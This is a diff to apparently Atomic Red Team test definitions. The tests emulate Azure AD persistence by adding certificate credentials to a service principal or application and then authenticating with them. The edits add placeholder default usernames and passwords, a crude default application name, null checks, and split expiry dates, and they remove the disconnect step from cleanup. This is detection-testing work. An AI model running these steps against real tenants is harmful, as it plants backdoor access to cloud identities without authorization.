@@ -13,13 +13,15 @@ atomic_tests:
     username:
       description: Azure AD username
       type: String
+      default: jonh@contoso.com
     password:
       description: Azure AD password
       type: String
+      default: p4sswd
     application:
       description: Targeted Application
       type: String
-      default: "SuperApplication"
+      default: "Application"
     certificate_password:
       description: Password of the new certificate
       type: string
@@ -44,22 +46,24 @@ atomic_tests:
       Connect-AzureAD -Credential $Credential
 
       $sp = Get-AzureADServicePrincipal -Searchstring "#{application}"
+      if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
       # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
-      $notAfter = (Get-Date).AddDays(1) 
-      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
+      $certNotAfter = (Get-Date).AddDays(2)
+      $credNotAfter = (Get-Date).AddDays(1)
+      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
       $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
       Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application}.pfx" -Password $pwd
 
       $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application}.pfx", $pwd)
       $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
 
-      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $notAfter
+      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $credNotAfter
 
+      Start-Sleep -s 15
       $tenant=Get-AzureADTenantDetail
       Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb
 
     cleanup_command: |
-      Disconnect-AzureAD
       rm "#{path_to_cert}\#{application}.pfx"
     name: powershell
     elevation_required: false
@@ -76,13 +80,15 @@ atomic_tests:
     username:
       description: Azure AD username
       type: String
+      default: "jonh@contoso.com" 
     password:
       description: Azure AD password
       type: String
+      default: p4sswd
     application:
       description: Targeted Application 
       type: String
-      default: "SuperApplication"
+      default: "MonCul"
     certificate_password:
       description: Password of the new certificate
       type: string
@@ -107,21 +113,23 @@ atomic_tests:
       Connect-AzureAD -Credential $Credential
 
       $app = Get-AzureADApplication -Searchstring "#{application}"
-      $notAfter = (Get-Date).AddDays(1)  
-      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
+      if ($app -eq $null) { Write-Warning "Application not found"; exit }
+      $certNotAfter = (Get-Date).AddDays(2)
+      $credNotAfter = (Get-Date).AddDays(1)
+      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
       $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
       Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application}.pfx" -Password $pwd
 
       $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application}.pfx", $pwd)
       $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
 
-      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $notAfter
+      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $credNotAfter
 
+      Start-Sleep -s 15
       $tenant=Get-AzureADTenantDetail
       Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb
 
     cleanup_command: |
-      Disconnect-AzureAD
       rm "#{path_to_cert}\#{application}.pfx"
     name: powershell
     elevation_required: false
